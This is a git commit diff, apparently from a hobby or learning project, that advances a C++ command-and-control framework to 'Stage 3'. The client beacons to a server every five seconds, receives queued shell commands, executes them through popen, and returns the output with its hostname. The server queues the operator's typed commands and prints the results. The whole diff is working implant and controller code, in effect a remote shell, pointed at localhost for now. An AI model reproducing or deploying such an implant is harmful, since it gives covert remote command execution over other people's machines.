2f1640373d786eccc21f8d324d7e86f4dd33c0d1
Nizar <officialnizarlahmar@gmail.com>
2026-05-30 12:03:32 -0400

    Stage 3 Done. C2 can now send commands and receive output, with beacon sent if no commands are queued.

--- client/main.cpp
+++ client/main.cpp
@@ -1,4 +1,5 @@
 #include <cstdint>
+#include <cstdio>
 #include <iostream>
 #include <string>
 #include <cstring>
@@ -17,13 +18,15 @@
 
 using namespace std;
 
+string clientHostname{};
+
 int connect_to_server(const string& ip, int port)
 {
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
     if (sockfd == -1)
     {
-        cout << "Socket creation failed." << endl;
+        cout << "[client] Socket creation failed." << endl;
         return -1;
     }
 
@@ -38,7 +41,6 @@ int connect_to_server(const string& ip, int port)
 
     if (connAttempt == -1)
     {
-        cout << "Error Connecting!" << endl;
         close(sockfd);
         return -1;
     }
@@ -55,7 +57,7 @@ int send_all(int fd, const string& msg)
 
     if (sent == -1)
     {
-        cout << "Problem Sending." << endl;
+        cout << "[client] Problem Sending." << endl;
         return -1;
     }
 
@@ -65,7 +67,7 @@ int send_all(int fd, const string& msg)
 
         if (sent == -1)
         {
-            cout << "Problem Sending." << endl;
+            cout << "[client] Problem Sending." << endl;
             return -1;
         }
 
@@ -75,21 +77,98 @@ int send_all(int fd, const string& msg)
     return bytesSent;
 }
 
-void beaconing(const string& ip, int port, atomic<bool>& running)
+string recv_all(int fd)
+{
+    uint32_t len{};
+    int rd = read(fd, &len, 4);
+    len = ntohl(len);
+
+    if (rd == -1)
+    {
+        return "";
+    }
+
+    size_t bytesRead{};
+    string str(len, '\0');
+
+    while (bytesRead < len)
+    {
+        int reading = recv(fd, str.data()+bytesRead, len-bytesRead, 0);
+        if (reading == -1)
+        {
+            return "";
+        }
+        else if (reading == 0)
+        {
+            cout << "[client] Session Exited." << endl;
+            break;
+        }
+        bytesRead += reading;
+    }
+
+    return str;
+}
+
+string execute(const string& command)
+{
+    string output = "";
+
+    FILE* process = popen(command.data(), "r");
+
+    if (process == nullptr)
+    {
+        return "EXEC_ERROR";
+    }
+
+    char buffer[256];
+
+    while (fgets(buffer, sizeof(buffer), process) != NULL)
+    {
+        output += buffer;
+    }
+
+    pclose(process);
+    return output;
+}
+
+void outputing(const string& ip, int port, atomic<bool>& running)
 {
     while (running)
     {
-        string beaconMsg = "Beacon. Awaiting.";
-        int fd = connect_to_server(ip, port);
+        int connfd = connect_to_server(ip, port);
 
-        if (fd == -1)
+        if (connfd == -1)
         {
+            cout << "[client] Couldn't Connect." << endl;
             this_thread::sleep_for(chrono::seconds(5));
-            continue; // trying again
+            continue;
         }
 
-        send_all(fd, beaconMsg); 
-        close(fd);
+        cout << "[client] Checking Queue." << endl;
+        string cmd = recv_all(connfd);
+
+        if (cmd != "NOP")
+        {
+            cout << "[client] Executing Command: " << cmd << endl;
+            string output = execute(cmd);
+
+            if (output == "EXEC_ERROR")
+            {
+                send_all(connfd, "[client] Couldn't Execute Command.");
+            }
+            else
+            {
+                send_all(connfd, output);
+            }
+        }
+        else
+        {
+            string beaconMsg = "[client] NOP. Beacon from [" + clientHostname + "].";
+            send_all(connfd, beaconMsg);
+            cout << "[client] Sent Beacon." << endl;
+        }
+
+        close(connfd);
 
         this_thread::sleep_for(chrono::seconds(5));
     }
@@ -99,10 +178,14 @@ int main()
 {
     atomic<bool> running = true;
 
+    char hostname[256];
+    gethostname(hostname, sizeof(hostname));
+    clientHostname = hostname;
+
     string ip = "127.0.0.1";
     int port = 6666;
 
-    thread beaconThread(beaconing, ref(ip), port, ref(running));
+    thread outputThread(outputing, ref(ip), port, ref(running));
 
-    beaconThread.join(); // wait here
+    outputThread.join(); // wait here
 }
--- server/main.cpp
+++ server/main.cpp
@@ -14,11 +14,14 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <unordered_set>
+#include <cstdio>
 
 using namespace std;
 
-atomic<bool> running = false;
+atomic<bool> running = true;
 int sockfd = -1;
+queue<string> commands{};
+mutex deadlock;
 
 void closeSocket(int sig)
 {
@@ -59,12 +62,43 @@ int server_setup(int port)
 
     if (lst == -1)
     {
-        cout << "Issue Establishing Listener." << endl;
+        cout << "[server] Issue Establishing Listener." << endl;
         close(listenfd);
         return -1;
     }
 
+    cout << "[server] listening on " << port << endl;
+
     return listenfd;
+}
+
+int send_all(int fd, const string& msg)
+{
+    size_t bytesSent{};
+    uint32_t len = htonl(msg.size());
+
+    int sent = send(fd, &len, sizeof(len), 0);
+
+    if (sent == -1)
+    {
+        cout << "[server] Problem Sending." << endl;
+        return -1;
+    }
+
+    while (bytesSent < msg.size())
+    {
+        sent = send(fd, msg.data() + bytesSent, msg.size() - bytesSent, 0);
+
+        if (sent == -1)
+        {
+            cout << "[server] Problem Sending." << endl;
+            return -1;
+        }
+
+        bytesSent += sent;
+    }
+    
+    return bytesSent;
 }
 
 string recv_all(int fd)
@@ -90,7 +124,7 @@ string recv_all(int fd)
         }
         else if (reading == 0)
         {
-            cout << "Session Exited." << endl;
+            cout << "[server] Session Exited." << endl;
             break;
         }
         bytesRead += reading;
@@ -99,7 +133,21 @@ string recv_all(int fd)
     return str;
 }
 
-int accepting(int fd, atomic<bool>& running)
+void main_handler(atomic<bool>& running)
+{
+    while (running)
+    {
+        string command{};
+        cout << "> ";
+        getline(cin, command);
+        {
+            lock_guard<mutex> guard(deadlock);
+            commands.push(command);
+        }
+    }
+}
+
+int connection_handler(int fd, atomic<bool>& running)
 {
     sockaddr_in clientAddr;
     socklen_t len = sizeof(clientAddr);
@@ -107,13 +155,16 @@ int accepting(int fd, atomic<bool>& running)
 
     while (running)
     {   
+        string cmd{};
+        string output{};
+
         int connfd = accept(fd, reinterpret_cast<sockaddr*>(&clientAddr), &len);
         
         if (connfd == -1)
         {
-            cout << "Connection Error. Trying Again." << endl;
+            cout << "[server] Connection Error. Trying Again." << endl;
             this_thread::sleep_for(chrono::seconds(2));
-            continue; // should we try again?
+            continue;
         }
 
         char ipStr[INET_ADDRSTRLEN];
@@ -121,21 +172,41 @@ int accepting(int fd, atomic<bool>& running)
 
         if (seenIPs.find(ipStr) == seenIPs.end())
         {
-            cout << "New connection: " << ipStr << endl;
+            cout << "[server] New Connection From: " << ipStr << endl;
             seenIPs.insert(ipStr);
         }
 
-        string output = recv_all(connfd);
+        {
+            lock_guard<mutex> guard(deadlock);
+            if (!commands.empty())
+            {
+                cmd = commands.front();
+                commands.pop();
+            }
+        }
+
+        if (!cmd.empty())
+        {
+            send_all(connfd, cmd);
+        }
+        else
+        {
+            send_all(connfd, "NOP");
+        }
+
+        output = recv_all(connfd); // receiving any command output
 
         if (output.empty())
         {
-            cout << "Empty String." << endl; // possible error
+            cout << "[server] Empty String." << endl; // possible error
             close(connfd);
             continue;
         }
-
-        cout << output << endl;
-        close(connfd);
+        else
+        {
+            cout << output << endl;
+            close(connfd);
+        }
     }
 
     return 0;
@@ -144,14 +215,16 @@ int accepting(int fd, atomic<bool>& running)
 
 int main()
 {
-    running = true;
     int port = 6666;
     sockfd = server_setup(6666);
 
     signal(SIGINT, closeSocket);
     signal(SIGTERM, closeSocket);
 
-    thread acceptThread(accepting, sockfd, ref(running));
+    thread connectionThread(connection_handler, sockfd, ref(running));
+    thread mainThread(main_handler, ref(running));
 
-    acceptThread.join(); // wait here
+    // wait here
+    connectionThread.join();
+    mainThread.join();
 }
